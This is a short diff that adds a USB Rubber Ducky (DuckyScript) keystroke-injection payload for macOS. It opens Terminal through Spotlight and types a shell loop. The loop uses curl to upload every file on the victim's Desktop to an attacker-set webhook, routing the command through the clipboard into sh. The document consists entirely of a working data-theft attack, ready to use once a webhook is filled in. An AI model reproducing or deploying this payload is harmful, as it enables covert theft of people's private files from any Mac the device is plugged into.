@@ -1,0 +1,19 @@
+REM =========================
+REM payload by bst04.
+REM =========================
+
+DELAY 1000
+GUI SPACE
+DELAY 250
+STRING TERMINAL
+DELAY 250
+ENTER
+DELAY 5000
+REM change webhook
+STRING echo for file in /Users/$(whoami)/Desktop/*; do curl -X POST -H "Content-Type: multipart/form-data" -F "file=@\"$file\"" webhook; done |pbcopy
+DELAY 850
+ENTER
+DELAY 250
+STRING pbpaste | sh
+DELAY 250
+ENTER
